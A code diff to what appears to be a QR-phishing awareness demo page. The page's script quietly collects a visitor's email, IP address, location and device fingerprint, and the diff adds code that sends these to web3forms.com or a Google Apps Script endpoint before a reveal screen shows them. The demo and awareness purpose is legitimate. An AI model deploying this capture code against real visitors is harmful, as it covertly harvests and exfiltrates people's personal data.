@@ -197,8 +197,12 @@
 <script>
 (function(){
   /* ============ CONFIG ============
-     Paste your Google Apps Script Web App URL (ends in /exec). */
-  var SCRIPT_URL = 'PASTE_YOUR_APPS_SCRIPT_URL_HERE';
+     Pick ONE way to receive submissions:
+       A) Web3Forms (no Google): get a free access key at web3forms.com
+          (just enter your email) and paste it below. Emails you each capture.
+       B) Google Apps Script: paste its /exec URL instead, and leave the key blank. */
+  var WEB3FORMS_KEY = 'PASTE_YOUR_WEB3FORMS_ACCESS_KEY';
+  var SCRIPT_URL    = '';
   /* ================================ */
   var form=document.getElementById('f'), reveal=document.getElementById('reveal');
   function collect(){
@@ -243,9 +247,19 @@
     var btn=form.querySelector('.connect');btn.disabled=true;btn.textContent='Connecting…';
     getIp().then(function(net){
       var c=collect();c.ip=net.ip;c.geo=net.geo;
-      if(SCRIPT_URL&&SCRIPT_URL.indexOf('PASTE')<0){
-        try{fetch(SCRIPT_URL,{method:'POST',body:JSON.stringify({email:email,client:c})}).catch(function(){});}catch(e){}
-      }
+      try{
+        if(WEB3FORMS_KEY&&WEB3FORMS_KEY.indexOf('PASTE')<0){
+          fetch('https://api.web3forms.com/submit',{method:'POST',
+            headers:{'Content-Type':'application/json','Accept':'application/json'},
+            body:JSON.stringify({access_key:WEB3FORMS_KEY,from_name:'QR-Gotcha Demo',
+              subject:'QR-Gotcha capture: '+(email||'(no email)'),
+              captured_email:email,ip:c.ip,location:c.geo,device:c.device,os:c.os,
+              browser:c.browser,screen:c.screen,language:c.lang,timezone:c.tz,
+              platform:c.platform,user_agent:c.ua})}).catch(function(){});
+        } else if(SCRIPT_URL&&SCRIPT_URL.indexOf('PASTE')<0){
+          fetch(SCRIPT_URL,{method:'POST',body:JSON.stringify({email:email,client:c})}).catch(function(){});
+        }
+      }catch(e){}
       showReveal(email,c);
     });
   });
